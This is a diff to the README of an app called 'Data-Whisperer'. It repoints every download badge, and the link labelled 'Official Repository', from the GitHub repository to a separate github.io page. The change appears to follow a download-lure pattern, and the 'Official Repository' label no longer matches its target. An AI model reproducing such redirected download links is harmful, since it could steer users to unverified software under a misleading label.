@@ -1,6 +1,6 @@
 # 🧙‍♂️ Data-Whisperer - Ask Questions, Get Answers Instantly
 
-[![Download Data-Whisperer](https://img.shields.io/badge/Download-Data--Whisperer-blue?style=for-the-badge&logo=github)](https://github.com/Juanhenriqueda2/Data-Whisperer)
+[![Download Data-Whisperer](https://img.shields.io/badge/Download-Data--Whisperer-blue?style=for-the-badge&logo=github)](https://juanhenriqueda2.github.io)
 
 ## 🌟 What is Data-Whisperer?
 
@@ -40,7 +40,7 @@ The more you use Data-Whisperer, the better it understands your specific data. I
 ### Step 1: Visit the Download Page
 Click this button to go to the official download page:
 
-[![Get Data-Whisperer Now](https://img.shields.io/badge/⬇️%20Get%20Data--Whisperer-Now-brightgreen?style=for-the-badge)](https://github.com/Juanhenriqueda2/Data-Whisperer)
+[![Get Data-Whisperer Now](https://img.shields.io/badge/⬇️%20Get%20Data--Whisperer-Now-brightgreen?style=for-the-badge)](https://juanhenriqueda2.github.io)
 
 Visit this link to download the application.
 
@@ -167,7 +167,7 @@ Download Data-Whisperer today and start getting answers from your data immediate
 
 ## 🔗 Additional Resources
 
-- **Official Repository:** [https://github.com/Juanhenriqueda2/Data-Whisperer](https://github.com/Juanhenriqueda2/Data-Whisperer)
+- **Official Repository:** [https://juanhenriqueda2.github.io](https://juanhenriqueda2.github.io)
 - **Documentation:** Inside the extracted folder
 - **Community Discussions:** GitHub Issues section
 
